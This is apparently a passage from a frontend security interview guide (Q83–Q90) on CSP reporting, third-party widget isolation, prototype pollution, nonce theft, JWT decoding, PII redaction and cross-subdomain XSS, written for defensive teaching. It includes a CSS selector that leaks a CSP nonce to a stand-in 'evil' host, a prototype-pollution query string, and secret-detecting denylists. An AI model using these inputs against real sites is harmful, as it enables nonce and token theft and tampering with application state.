**Why classification is the hard, valuable part:** a CSP in report-only or enforce mode generates reports for *both* failure modes, and they demand opposite responses. A **config gap** — you added Google Tag Manager but forgot `googletagmanager.com` in `script-src` — produces violations against a *known, legitimate* third party; the fix is to widen the allowlist (or nonce it). An **active attack** — someone found an injection point and is probing — produces violations with very different fingerprints: **inline script blocks** (an injected `<script>...</script>` has no nonce, so `blocked-uri` is `inline`), **`javascript:`/`data:` scheme** attempts, **`connect-src` violations to unknown external origins** (a skimmer trying to *exfiltrate* — the highest-severity signal, Q23/Q78), and `script-sample` snippets containing tells like `document.cookie`, `eval`, or `fetch(`. Routing the first to "update config" and the second to "page the on-call" is what makes CSP reporting an actual intrusion-detection system rather than noise.

The production engineering around it: the endpoint must **always return 204 and never let reporting failures affect users** (it's telemetry, not a critical path), handle **both report formats** (the modern Reporting API sends `application/reports+json` arrays; legacy sends a single `application/csp-report` object) since browsers differ, and aggressively **deduplicate and rate-limit** because a single broken asset on a high-traffic page can generate millions of identical reports (and attackers can flood the endpoint). Real systems aggregate by `(directive, blocked-origin, document)` and alert on *novelty and rate* — a *new* `connect-src` violation appearing on the checkout page is a far stronger attack signal than a long-known styling violation. The expert framing: CSP violation reports are a dual-use signal — debugging telemetry *and* a live injection alarm — and the value is entirely in the triage layer that separates "we misconfigured" from "we're under attack," with `connect-src`-to-unknown-origin and inline-script-block being the highest-confidence attack indicators. **Time/Space:** O(reports) ingest; O(1) per-report classification.

#### Q83. [Theory] Design exercise: you're adding a third-party live-chat widget to a banking app's authenticated pages. Walk through how you'd evaluate and contain it.

This is a high-stakes containment problem: a third-party chat widget is *someone else's JavaScript* that you're invited to run on pages where the user is authenticated to their *bank account* — so a compromise of (or a malicious feature in) that vendor is a direct path to customer financial data. My evaluation has two phases: *should we trust this vendor at all*, and *how do we contain them so trust isn't all-or-nothing*.

```
Decision tree for a 3p script on a sensitive page
-------------------------------------------------------------------------------
Q: does it NEED to run in the main origin's DOM?  (most chat widgets do NOT)
        │ no                                   │ yes (rare)
        ▼                                       ▼
  ISOLATE in a sandboxed iframe on a       Heavy scrutiny: SRI-pin a fixed version,
  separate origin (best):                  nonce it, lock connect-src, vendor security
   - widget can't read bank DOM/cookies     review, contract/SLA, continuous monitoring
   - communicate via origin-checked          (accept residual risk explicitly, sign-off
     postMessage RPC (Q70)                    from security leadership)
   - per-frame CSP + Permissions-Policy
```

**Vendor evaluation (trust).** Before any code, I assess the vendor as a supply-chain dependency (Q16): their security posture (SOC 2 / pen-test reports), how the script is delivered (a versioned, immutable URL I can SRI-pin, or a mutable "latest" that auto-updates — the latter is a standing risk, the polyfill.io lesson, Q23/Q78), their own subprocessor/dependency hygiene, and the contractual/compliance fit (a banking app has regulatory obligations about data sharing and processors). A chat vendor that can't give me a pinnable version and a security review doesn't go on authenticated pages, full stop.

**Containment (so trust isn't binary).** The architectural decision is to **not run the widget in the bank's main origin** if at all avoidable — most chat widgets only need their own UI surface, so I embed them in a **sandboxed iframe served from a separate origin** (Q27): `sandbox="allow-scripts"` without `allow-same-origin` gives an opaque origin, so the widget's JS *cannot read the banking DOM, cookies, or session* even if it's outright malicious. Interaction between the page and the widget goes through an **origin-checked, schema-validated `postMessage` RPC** (Q70) exposing only the minimal data the chat legitimately needs (maybe a display name and a support ticket ID — never account numbers or session tokens). I apply a **per-frame CSP** locking the widget's `connect-src` so it can only talk to the vendor's known endpoints (containing exfiltration), and a **`Permissions-Policy`** (Q56) stripping camera/mic/geolocation/payment so it can't request sensitive capabilities. The bank's *own* pages get a strict CSP with locked `connect-src`/`script-src` and `frame-ancestors`, and I'd consider not loading the widget on the most sensitive flows (the actual money-transfer step) at all.

The expert framing: on a banking page the question is never "is this vendor trustworthy?" but "**how do I architect so that even a fully-compromised vendor can't reach customer money or sessions?**" — and the answer is origin isolation via a sandboxed cross-origin iframe plus a narrow `postMessage` capability interface, which converts an all-or-nothing trust decision into a contained, least-privilege one. If a widget *must* run in the main origin (rare, and a red flag), then the residual risk is real and must be pinned (SRI), constrained (CSP), continuously monitored, and explicitly signed off by security leadership — because you've accepted that vendor's compromise as equivalent to your own.

#### Q84. [Coding] Implement defensive guards against prototype pollution and DOM clobbering in a config-merging utility that reads from `URLSearchParams` and a DOM-provided object.

**Problem:** A widget builds its runtime config by merging defaults with values parsed from the URL query string and a `window.__WIDGET_CONFIG__` object that may be set by surrounding (untrusted) page markup. Harden the merge against prototype pollution (Q37) and the config read against DOM clobbering (Q46).

```javascript
const DANGEROUS_KEYS = new Set(['__proto__', 'prototype', 'constructor']);

// Null-prototype target: nothing to pollute, and no inherited surprises.
function safeMerge(target, source) {
  for (const key of Object.keys(source)) {        // own enumerable keys only (no for..in)
    if (DANGEROUS_KEYS.has(key)) continue;          // 1. drop pollution vectors
    const val = source[key];
    if (val && typeof val === 'object' && !Array.isArray(val)) {
      target[key] = safeMerge(Object.create(null), val);   // recurse into null-proto
    } else {
      target[key] = val;
    }
  }
  return target;
}

function parseQueryConfig(search) {
  const out = Object.create(null);                  // map-like, no prototype
  for (const [k, v] of new URLSearchParams(search)) {
    if (DANGEROUS_KEYS.has(k)) continue;
    out[k] = v;                                     // all values are strings here
  }
  return out;
}

// DOM clobbering defense: window.__WIDGET_CONFIG__ might be an injected <a id=...>,
// not the JS object we expect. Verify it's a real, plain object before trusting it.
function readDomConfig() {
  const raw = window.__WIDGET_CONFIG__;
  const isPlainObject =
    raw != null &&
    typeof raw === 'object' &&
    !(raw instanceof Element) &&                    // 2. reject clobbered DOM nodes
    Object.getPrototypeOf(raw) === Object.prototype;
  return isPlainObject ? raw : {};
}

export function buildConfig(defaults, search = location.search) {
  const cfg = safeMerge(Object.create(null), defaults);
  safeMerge(cfg, parseQueryConfig(search));
  safeMerge(cfg, readDomConfig());
  // Validate critical fields by TYPE, never trust truthiness of a clobbered value.
  cfg.maxItems = Number.isInteger(cfg.maxItems) ? cfg.maxItems : 20;
  return cfg;
}
```

**The two distinct attacks this defends, in one utility:** *prototype pollution* (Q37) enters through the **keys** of untrusted input — a query string like `?__proto__[isAdmin]=1` or a crafted object with a `__proto__` property, processed by a naive recursive merge using `for...in`, writes onto `Object.prototype` and poisons every object app-wide. The guards: iterate `Object.keys` (own enumerable only, skipping inherited/magic keys), explicitly **drop `__proto__`/`prototype`/`constructor` keys**, and use **`Object.create(null)`** for the merge target and parsed maps so there's literally no prototype chain to pollute. *DOM clobbering* (Q46) enters through the **value** of a global the code reads: injected markup like `<a id="__WIDGET_CONFIG__">` makes `window.__WIDGET_CONFIG__` resolve to an `HTMLElement` (or an `HTMLCollection`) instead of the expected object, and naive code that does `if (window.__WIDGET_CONFIG__.someFlag)` can be tricked because element properties can be made truthy. The guard is **type-checking the value** before trusting it — reject anything that's an `Element` or whose prototype isn't `Object.prototype` — and validating critical fields by *type* (`Number.isInteger`) rather than truthiness.

The unifying senior insight (stated in Q37 and reinforced here): **untrusted keys are as dangerous as untrusted values, and reading globals/DOM for trusted state is itself a vulnerability.** A config merge is a deceptively dangerous primitive because it touches both — it processes attacker-influenced keys (pollution) and may read an attacker-clobberable global (clobbering). The robust posture is to treat config assembly as a security boundary: null-prototype containers everywhere, an explicit dangerous-key denylist, own-keys-only iteration, and type-validated reads of anything sourced from the DOM or URL. Even better where feasible is to **validate the whole result against a strict schema** (Zod/Ajv) so unexpected keys are dropped and types are enforced in one declarative place, and to avoid reading security-relevant flags from globals at all (module-scoped `const`, Q46). **Time/Space:** O(n) over total key count across sources.

#### Q85. [Theory] Expert edge case: explain how a CSP `nonce` can be stolen or bypassed (CSS injection / dangling-markup nonce exfiltration, cached pages, DOM-reflected nonces), and how to harden against it.

A nonce-based CSP is the modern gold standard, but "we use nonces" isn't automatically safe — there are several documented ways a nonce gets *stolen* or *rendered ineffective*, and a staff engineer should be able to enumerate them because they're the difference between a strict CSP that actually holds and one that looks strict on paper. The premise of a nonce is *unpredictability* — the attacker can't put the right `nonce` attribute on injected script because they don't know the random value. Every bypass attacks that premise.

```
Nonce attack / weakness          Mechanism                                  Hardening
-------------------------------  -----------------------------------------  --------------------------
Reused / cached nonce            same nonce served to many users/pages ->   per-RESPONSE nonce;
                                 predictable/known -> attacker reuses it    Cache-Control: no-store on
                                                                            nonced HTML (Q63)
CSS-injection nonce exfiltration attacker injects CSS that uses attribute   don't reflect nonce into
                                 selectors to leak the nonce char-by-char   readable attributes; keep
                                 (e.g. [nonce^="a"]{background:url(...)} )   style-src strict too
Dangling-markup nonce theft      injected unclosed markup captures the      strict markup context;
                                 nonce attribute of a later <script> into   avoid reflecting user input
                                 an attacker-controlled URL                 near nonced scripts
DOM-reflected/leaked nonce       app copies the nonce into the DOM/JS where strip nonce from DOM after
                                 injected script can READ it                use; never echo it as data
Overly broad fallback            script-src has nonce + 'unsafe-inline' or  nonce + 'strict-dynamic'
                                 'self' that gadgets abuse (Q71)            ONLY; drop unsafe fallbacks
```

The non-obvious ones worth explaining: **(1) CSS-injection nonce exfiltration** — if an attacker can inject *CSS* (even without script execution), they can use attribute-substring selectors (`script[nonce^="aQ"] { background: url(//evil/aQ) }`) to leak the nonce one character at a time via which background requests fire; this is why `style-src` must also be strict and why you shouldn't put the nonce anywhere CSS selectors can match it as readable data. **(2) Dangling-markup / nonce-reflection theft** — if user input is reflected into the page *near* a nonced script and the markup context lets an attacker open an unclosed attribute/tag, they can "capture" the following script's nonce attribute into an attacker-controlled URL; the defense is not reflecting untrusted input into HTML contexts that border nonced elements. **(3) The cached-nonce failure (Q63)** — the most common real-world break: caching an HTML page with its nonce baked in, or reusing a nonce across responses, makes the value *known*, collapsing it to effectively `'unsafe-inline'`; nonces must be per-response and nonced HTML must be `no-store`. **(4) DOM-reflected nonce** — frameworks or app code that copy `nonce` into a readable DOM attribute or JS variable hand it to any injected script that can read the DOM.

The hardening synthesis: a nonce is only as strong as its *unpredictability and non-readability*, so (a) generate it per-response from a CSPRNG and never cache the page that carries it; (b) keep `style-src` strict too, because CSS injection alone can exfiltrate it; (c) don't reflect untrusted input into HTML near nonced scripts (dangling-markup) and don't echo the nonce into readable DOM/JS; and (d) pair `nonce` with `'strict-dynamic'` and drop `'unsafe-inline'`/broad host fallbacks so a gadget (Q71) can't sidestep the nonce requirement entirely. The expert framing: nonces shift the attacker's problem from "inject a script" to "obtain or predict the nonce," so the defense is closing every channel — caching, CSS side channels, dangling markup, DOM reflection — through which that nonce could leak or be reused. Browsers also hide the nonce from the DOM (`element.nonce` is cleared and the attribute isn't reflected) precisely to fight DOM-reflected theft, but app-level reflection can undo that protection.

#### Q86. [Coding] Write a client-side JWT helper that *decodes* claims for UX (showing expiry, scheduling refresh) while making it impossible to mistake decode for verification.

**Problem:** The SPA holds a short-lived access token and wants to read `exp` to schedule a proactive refresh and read non-sensitive claims for UI. Implement a decoder that is *safe by construction* — base64url-decodes the payload, never validates the signature, and is named/typed so no one treats its output as trusted.

```javascript
// Deliberately named to signal "NO signature verification happens here."
// The returned claims are ATTACKER-CONTROLLED and may ONLY drive UX, never authz.
function unsafeDecodeJwtForDisplay(token) {
  if (typeof token !== 'string') return null;
  const parts = token.split('.');
  if (parts.length !== 3) return null;            // header.payload.signature
  try {
    const payloadJson = atob(parts[1].replace(/-/g, '+').replace(/_/g, '/'));
    const claims = JSON.parse(payloadJson);
    return Object.freeze(claims);                  // freeze: callers can't mutate & re-trust
  } catch {
    return null;                                   // malformed -> no claims
  }
}

// Use the decoded exp ONLY to schedule a refresh slightly early. The server still
// independently verifies the signature & exp on every request (Q41) — this is UX.
function msUntilRefresh(token, skewMs = 30_000) {
  const claims = unsafeDecodeJwtForDisplay(token);
  if (!claims || typeof claims.exp !== 'number') return 0; // unknown -> refresh now
  const expiresAt = claims.exp * 1000;            // exp is seconds since epoch
  return Math.max(0, expiresAt - Date.now() - skewMs);
}

// Example: proactively refresh ~30s before expiry to avoid a 401 mid-flight.
function scheduleProactiveRefresh(token, refreshFn) {
  return setTimeout(refreshFn, msUntilRefresh(token));
}
```

**Why the *naming and shape* are the security feature:** a JWT payload is just base64url-encoded JSON — decoding it performs **zero cryptographic checks** (Q41), so any claim read on the client is exactly as trustworthy as a value the user typed. The perennial bug is a developer writing `const { isAdmin } = decode(token); if (isAdmin) …` and treating the decoded claim as an authorization gate; it's trivially forged by minting a token with `isAdmin: true` (the server would reject the bad signature, but the *client* gate already opened the UI and, worse, the developer may have believed it was secure). So the defensive design here is sociotechnical: name the function `unsafeDecodeJwtForDisplay` so every reader is reminded it doesn't verify, `Object.freeze` the result so it reads as inert data, and document that its *only* legitimate uses are UX — showing a username, scheduling a refresh from `exp`, deciding which nav links to *render* (not enforce).

The legitimate use case — reading `exp` to refresh proactively — is genuinely valuable: it avoids the latency hit of letting requests 401 and retry (Q30) by refreshing ~30s before expiry, with a skew buffer for clock drift. But even that must degrade safely: if `exp` is missing or the token is malformed, return "refresh now / 0" rather than trusting a default, because the client's clock and the token are both untrustworthy. The interview signal is recognizing that *decode ≠ verify* and encoding that distinction into the API surface itself, so the next engineer can't accidentally promote display data into a trust decision — verification lives on the server, pinned to an explicit algorithm, rejecting `alg:none` (Q41). **Time/Space:** O(n) over the token's payload length for the base64 decode and JSON parse.

#### Q87. [Coding] Implement a privacy-preserving analytics wrapper that redacts PII and tokens from URLs/events before they leave the browser.

**Problem:** Your analytics SDK auto-captures page URLs, referrers, and form interactions, which routinely leak PII and secrets (password-reset tokens in URLs, emails in query params, session IDs) to a third-party origin. Build a redaction layer that scrubs events client-side *before* transmission and enforces an allowlist of fields.

```javascript
// Patterns for values that must NEVER leave the browser in analytics.
const SENSITIVE_PARAM_KEYS = /^(token|reset|auth|password|session|sid|otp|code|email|ssn|card)/i;
const SENSITIVE_VALUE = [
  /[\w.+-]+@[\w-]+\.[\w.-]+/g,                 // emails
  /\b\d{13,19}\b/g,                             // PAN-like long digit runs (cards)
  /eyJ[\w-]+\.[\w-]+\.[\w-]+/g,                 // JWT-shaped strings
];

function redactUrl(rawUrl) {
  try {
    const u = new URL(rawUrl, location.origin);
    for (const key of [...u.searchParams.keys()]) {
      if (SENSITIVE_PARAM_KEYS.test(key)) u.searchParams.set(key, '[REDACTED]');
    }
    u.hash = '';                                 // fragments often carry tokens too
    return u.origin + u.pathname + (u.search ? u.search : '');
  } catch { return '[INVALID_URL]'; }
}

function redactString(s) {
  return SENSITIVE_VALUE.reduce((acc, re) => acc.replace(re, '[REDACTED]'), String(s));
}

// Only allowlisted event fields are ever sent; everything else is dropped, not redacted.
const ALLOWED_EVENT_FIELDS = new Set(['name', 'category', 'page', 'referrer', 'durationMs']);

function sanitizeEvent(evt) {
  const out = {};
  for (const [k, v] of Object.entries(evt)) {
    if (!ALLOWED_EVENT_FIELDS.has(k)) continue;            // 1. allowlist fields
    if (k === 'page' || k === 'referrer') out[k] = redactUrl(v);  // 2. scrub URLs
    else out[k] = typeof v === 'string' ? redactString(v) : v;    // 3. scrub values
  }
  return out;
}

export function track(evt) {
  const clean = sanitizeEvent(evt);
  navigator.sendBeacon('/first-party/analytics', JSON.stringify(clean)); // 4. proxy via 1p endpoint
}
```

**Why client-side redaction is a real security control, not just compliance hygiene:** analytics SDKs are *third-party scripts that auto-capture context* — full URLs (including `?reset_token=...` from a password-reset page), `document.referrer`, form field values, and DOM text — and ship it to a vendor origin you don't control. That's a direct PII/secret exfiltration channel that has caused real breaches (session tokens and reset links ending up in third-party logs). The mitigation has two complementary halves visible in the code: **redaction** (scrub known-sensitive query params by key, strip URL fragments which commonly carry tokens, and regex-mask emails/card-shaped/JWT-shaped values in free text) and, more robustly, an **allowlist of fields** — `sanitizeEvent` *drops* anything not explicitly permitted rather than trying to redact everything, because a denylist of "sensitive patterns" will always miss something, while an allowlist fails closed.

The architectural upgrade is the **first-party proxy**: instead of letting the vendor SDK beacon directly to `vendor.com`, route events through your own `/first-party/analytics` endpoint where you can re-validate, enforce the redaction server-side (the client is untrusted, Q3 — client redaction is best-effort UX/bandwidth, the server is authoritative), strip anything that slipped through, and *then* forward to the vendor. This also restores first-party cookies (post-3p-cookie-deprecation, Q45) and lets your CSP `connect-src` stay locked to your own origin (Q78) instead of allowlisting the vendor's exfil endpoint. The senior framing: any auto-capturing third-party script on an authenticated or token-bearing page is a data-exfiltration surface, and the defenses are *field allowlisting* (fail-closed), *URL/value redaction* (fragments and sensitive params especially), and ideally a *first-party proxy* so redaction is enforced server-side and the third party never sees raw events. Client-side scrubbing alone is necessary but not sufficient, exactly because it runs in a context the user (and any XSS) controls. **Time/Space:** O(n) over event size for the regex passes.

#### Q88. [Theory] Design the complete security-header and CSP baseline for a *static-hosted SPA* (no server in the request path, assets on a CDN). What's different from an SSR app, and how do you handle CSP without per-request nonces?

A purely static SPA — built to immutable files and served by a CDN/object store with no application server in the request path — can't generate a per-request nonce (the canonical strict-CSP mechanism, Q63), so the header strategy is genuinely different and a common source of "we can't do strict CSP" defeatism that's actually wrong. The constraint shapes every choice: headers must come from the **CDN/edge config** (or a `_headers`/edge-function layer), and CSP must be enforced via **hashes** rather than nonces.

```
Static SPA security-header baseline (set at the CDN/edge):
-------------------------------------------------------------------------------
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), camera=(), microphone=(), payment=()
Cross-Origin-Opener-Policy: same-origin
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'sha256-<hash-of-bootstrap-inline>' 'strict-dynamic';
  style-src 'self';
  object-src 'none'; base-uri 'self'; frame-ancestors 'none';
  connect-src 'self' https://api.example.com;
  require-trusted-types-for 'script';
```

**Why hashes replace nonces here:** a static build produces a *fixed, known set* of scripts at build time, so instead of a per-response random nonce you compute the **SHA-256 hash of each inline script** and list it in `script-src` (`'sha256-…'`). A modern SPA usually has exactly one tiny inline bootstrap (or none — everything is external `'self'` bundles), so this is tractable, and the build tool can generate the hash and inject it into the CSP automatically (Vite/webpack CSP plugins do this). Combine the hash with **`'strict-dynamic'`** so the bootstrap script can load the rest of the app's chunks without you hashing every one — `strict-dynamic` propagates trust from the hashed entry point to the scripts it loads, giving you a strict, gadget-resistant policy (Q71) without nonces and without a host allowlist. External first-party bundles are covered by `'self'`.

The other differences from SSR: **headers live at the edge**, so the discipline is to enforce them at the CDN/hosting layer (Netlify/Cloudflare/S3+CloudFront `_headers` or response-header rules) and to **verify externally** (Q58) because there's no server to assert them and a CDN config change can silently drop them. The SPA's API lives on a *separate* origin, so `connect-src` must allowlist exactly that API origin (and CORS, Q11, governs the cross-origin reads), and auth uses the in-memory-token + `HttpOnly`-refresh-cookie or BFF pattern (Q12/Q24) — note a *pure* static SPA with no backend at all can't run a BFF, which is itself a security consideration (Q24). Because the HTML/JS is immutable and cacheable, **SRI** on any third-party CDN scripts is especially valuable (Q15), and you don't have the per-request-nonce caching pitfall (the page is *meant* to be cached, and hashes are cache-safe whereas nonces aren't). The expert framing: "no server" doesn't mean "no strict CSP" — it means you swap *nonces for hashes + `strict-dynamic`*, move all headers to the edge, verify them externally since nothing asserts them at runtime, and lean harder on SRI and cache-safe immutable assets; the security posture can be just as strong, it's just *built* and *configured at the edge* rather than *generated per request*.

#### Q89. [Coding] Implement a `subresource sandbox` for an untrusted HTML fragment using `<iframe sandbox srcdoc>` instead of rendering it in the host DOM. When is this better than DOMPurify?

**Problem:** You must display an untrusted HTML fragment (e.g., a rendered email body, a third-party ad snippet, a user-submitted "HTML signature") with full fidelity — you *can't* strip it down to a small allowlist the way DOMPurify would. Render it inside a sandboxed iframe so it executes (if at all) in an isolated, powerless context that can't touch the host.

```javascript
function renderUntrustedFragment(hostEl, untrustedHtml) {
  const frame = document.createElement('iframe');

  // sandbox WITHOUT allow-same-origin => the frame gets a UNIQUE OPAQUE origin:
  // its scripts (if we even allow them) can't read host cookies/DOM/localStorage.
  // Omit 'allow-scripts' entirely if the fragment never needs JS (safest).
  frame.sandbox = '';                       // most locked-down: no scripts, no forms, no nav
  // If the content genuinely needs scripts but must stay isolated:
  // frame.sandbox = 'allow-scripts';       // scripts run, but in an opaque, powerless origin

  frame.referrerPolicy = 'no-referrer';
  frame.setAttribute('csp', "default-src 'none'; img-src data: https:; style-src 'unsafe-inline'");
  frame.style.cssText = 'border:0; width:100%;';

  // srcdoc renders the fragment as the iframe's document. With sandbox='' any
  // <script>/onerror inside it is inert; with 'allow-scripts' it runs but isolated.
  frame.srcdoc = wrapFragment(untrustedHtml);
  hostEl.replaceChildren(frame);

  // Auto-size to content (same-origin read is blocked, so post height from inside,
  // or use a ResizeObserver bridge via postMessage if scripts are allowed).
  return frame;
}

function wrapFragment(html) {
  // Provide a minimal, locked document around the fragment.
  return `<!doctype html><html><head>
    <meta http-equiv="Content-Security-Policy"
          content="default-src 'none'; img-src data: https:; style-src 'unsafe-inline'">
    <base target="_blank" rel="noopener noreferrer">
  </head><body>${html}</body></html>`;
}
```

**The isolation model and why it differs from sanitization:** DOMPurify (Q65) makes untrusted HTML safe by **removing** dangerous parts and rendering the *cleaned* result *in your origin* — perfect when you want a small, known set of formatting tags, but it necessarily *changes the content* (strips scripts, styles, layout) and any sanitizer bypass (mXSS, Q39) executes with your origin's full privileges. The sandboxed-iframe approach takes the opposite tack: render the content **unmodified** but in a context that's **powerless by construction**. `sandbox=""` (empty) disables scripts, forms, popups, and top-navigation, so even `<script>`/`onerror` in the fragment is inert; adding `allow-scripts` *without* `allow-same-origin` lets script run but in a **unique opaque origin** that cannot read the host's cookies, `localStorage`, or DOM — so a successful "XSS" inside the frame is contained to a sandbox with nothing valuable in it. Layer a per-frame CSP (`default-src 'none'` + only what's needed) for defense in depth, `no-referrer` to stop URL leakage, and `<base target="_blank" rel="noopener noreferrer">` so links don't navigate the host (Q32).

When to choose which: use **DOMPurify** when you want *integrated, styled* content that looks like part of your app and you can accept a restricted tag set (comments, chat, basic rich text) — it composes with your layout and is lighter weight. Use the **sandboxed iframe** when you must preserve *full fidelity of arbitrary/complex untrusted HTML* (rendered emails with their own styling, third-party ad/widget markup, an HTML "preview" of user-pasted documents) where stripping to an allowlist would break the content, or when the content is *so* untrusted that you want origin-level isolation rather than betting on a sanitizer being bypass-free. The strongest designs combine them: sandbox the iframe **and** serve it from a separate origin (Q27) for true SOP isolation (the `srcdoc`/opaque-origin trick is good, a distinct origin is better against same-origin-bypass edge cases), and still sanitize on the way in as defense in depth. The expert framing: sanitization *transforms content to be safe in your origin*; sandboxing *isolates content so its safety doesn't depend on transforming it* — the former for integrated restricted rich text, the latter for high-fidelity, high-distrust, or executable third-party content. **Time/Space:** O(n) over fragment size to build the document string.

#### Q90. [Theory] Expert synthesis: a single reflected XSS was found on your marketing site (`www.example.com`), which is a *different* origin from your app (`app.example.com`). Walk through whether and how it can still compromise the app, and what cross-origin hardening contains it.

This question probes whether a candidate understands that **origin boundaries contain XSS but don't always isolate the consequences** — the naive answer is "different origin, so the app is safe," and the expert answer is "it depends entirely on how cookies, subdomains, and cross-window relationships are configured between the two." The marketing-site XSS executes in `www.example.com`'s origin, so by SOP (Q2) it cannot directly read `app.example.com`'s DOM or `localStorage`. But several real channels can bridge the gap, and a staff engineer enumerates them.

```
Can XSS on www.example.com reach app.example.com?  Depends on configuration:
-------------------------------------------------------------------------------
Channel                          Reachable if...                  Hardening
-------------------------------  -------------------------------  -----------------------------
Shared cookies (Domain=          session cookie scoped to         host-only cookies (no Domain);
example.com)                     .example.com -> sent to BOTH     __Host- prefix (Q31); separate
                                 www and app                      cookie names/scopes per host
"Same-site" CSRF                 SameSite=Lax treats www & app    CSRF tokens + Origin/Sec-Fetch
                                 as SAME-SITE -> www can make      checks on app (Q64/Q81);
                                 state-changing reqs w/ cookies    don't rely on SameSite alone
window.opener / framing          app opened by or framed by www   COOP: same-origin on app;
                                 -> cross-window references        frame-ancestors 'none' (Q22)
Token in shared storage          (shouldn't exist) localStorage   never share auth across origins;
                                 is per-origin, so NOT shared      tokens in-memory/HttpOnly (Q12)
Pivot via redirect/oauth         www hosts an open redirect or    validate redirect_uri; no open
                                 is a registered oauth origin     redirects (Q33)
```

The decisive factors: **(1) cookie scoping.** If the session cookie is set with `Domain=example.com`, it's sent to *every* subdomain including the compromised `www` — so the XSS can ride the user's authenticated session by making requests to `app.example.com`'s API (the cookie attaches automatically), and `HttpOnly` doesn't help because the attacker doesn't need to *read* the cookie, just *send* requests with it. The hardening is **host-only cookies** (omit `Domain`, or use the `__Host-` prefix, Q31) so the app's session cookie is *never* sent to `www`. **(2) "Same-site" is not "same-origin"** (Q81): `www.example.com` and `app.example.com` share the registrable domain, so `SameSite=Lax/Strict` considers them *same-site* — cross-subdomain requests carry the cookie, meaning the marketing XSS can perform same-site CSRF against the app unless the app independently enforces CSRF tokens and `Sec-Fetch-Site`/`Origin` checks (which see `www` as a different origin even though it's same-site). **(3) Cross-window relationships:** if the app is ever opened from or framed by the marketing site, `window.opener`/frame references can leak; `COOP: same-origin` and `frame-ancestors 'none'` on the app sever those.

The synthesis an expert delivers: a cross-origin XSS is *contained* by SOP from directly reading the app, but the **blast radius is governed by what the two origins *share*** — cookies (the big one), same-site request privileges, and window relationships. The architecture that truly isolates a marketing-site compromise from the app is: **host-only / `__Host-` session cookies** so authentication never leaks to sibling subdomains; **app-side CSRF tokens + `Sec-Fetch`/`Origin` validation** that don't trust "same-site"; **`COOP` and `frame-ancestors`** to cut window/framing bridges; **no shared auth storage** (tokens in memory/`HttpOnly`, per-origin); and ideally hosting truly-untrusted/lower-assurance properties (marketing, user content) on a **separate registrable domain entirely** (e.g., `example-cdn.net`) so they're not even same-*site* — which is exactly why GitHub uses `githubusercontent.com` and Google uses `googleusercontent.com`. The interview-grade insight: "different origin" answers *can it read the app directly* (no), but the real question is *what do these origins share* — and the senior engineer's job is to minimize that sharing so a compromise of the least-trusted property can't pivot into the crown-jewel app.

## ✅ Key Takeaways

- **The frontend is never a security boundary.** Client-side checks are UX; every authentication and authorization decision must be re-enforced server-side. The user controls the browser.
- **XSS is the dominant frontend threat.** Defend with framework auto-escaping, context-aware output encoding, DOMPurify for any raw HTML, and a strict nonce-based CSP + Trusted Types as defense in depth.
- **SOP blocks reading, not sending** — that asymmetry is why CSRF exists. Defend with `SameSite` cookies (baseline), anti-CSRF tokens, and `Origin`/`Sec-Fetch` checks.
- **Token storage is an XSS-vs-CSRF trade-off.** Prefer `HttpOnly` cookies (or in-memory access token + `HttpOnly` refresh cookie); the **BFF pattern** is the modern gold standard so the browser never holds OAuth tokens at all.
- **SPAs are public clients** — always use **Authorization Code + PKCE**, never the deprecated implicit flow.
- **Security is layered.** CSP, Trusted Types, `frame-ancestors`, HSTS, SRI, COOP/COEP, Fetch Metadata, and `SameSite` overlap so defeating one control runs into the next.
- **Third-party scripts are your attack surface.** SRI + strict CSP `connect-src`/`script-src`, self-hosting critical assets, SBOMs, and dependency scanning defend the supply chain (British Airways, polyfill.io).
- **Shift security left** — automate lint/SAST/dependency gates in CI and treat CSP violation reports as a live attack early-warning system.

## ⚠️ Common Pitfalls

- Trusting `dangerouslySetInnerHTML` / `v-html` / `bypassSecurityTrustHtml` without sanitizing — the most common reintroduction of XSS in framework apps.
- Storing long-lived JWTs in `localStorage`, then being unable to revoke them and losing them all to a single XSS.
- `Access-Control-Allow-Origin: *` together with credentials, or blindly reflecting the `Origin` header — both are critical CORS misconfigurations.
- Treating CORS as access control. CORS only restricts *browser* reads; curl/servers ignore it. Authorize on the server.
- Allowing `'unsafe-inline'` in `script-src`, which renders CSP nearly useless against XSS.
- Using GET for state-changing actions, making them trivially CSRF-able via `<img>`/`<link>`.
- Missing `event.origin` validation in `postMessage` handlers, or sending sensitive data with target origin `'*'`.
- Pinning SRI to a mutable/`latest` URL (breaks on every update) or omitting `crossorigin="anonymous"`.
- Enabling `SharedArrayBuffer`/high-res timers without understanding that COOP+COEP cross-origin isolation is required to do so safely.
- Regex-based URL/scheme sanitization that's bypassed by case (`JaVaScRiPt:`), control characters, or protocol-relative URLs — use the URL parser and an allowlist.

## 📚 Further Reading

- **OWASP Cheat Sheet Series** — especially XSS Prevention, DOM-based XSS Prevention, CSRF Prevention, and Content Security Policy cheat sheets (cheatsheetseries.owasp.org). The single best practical reference.
- **OWASP Top 10** (owasp.org/Top10) — the canonical list of web application risks, with Injection (incl. XSS) and broken access control consistently at the top.
- **MDN Web Docs — Web Security** (developer.mozilla.org/en-US/docs/Web/Security) — authoritative reference on CSP, CORS, SOP, COOP/COEP, SameSite, SRI, and Permissions Policy.
- **web.dev / Google Security** — strict CSP, Trusted Types, Fetch Metadata, and cross-origin isolation guides from the engineers who shipped them.
- **"The Tangled Web: A Guide to Securing Modern Web Applications"** by Michał Zalewski — the definitive deep dive into browser security models and their quirks.
- **OAuth 2.0 for Browser-Based Apps (IETF BCP draft)** and **OAuth 2.0 Security Best Current Practice (RFC 9700)** — the current authoritative guidance on PKCE and the BFF pattern.
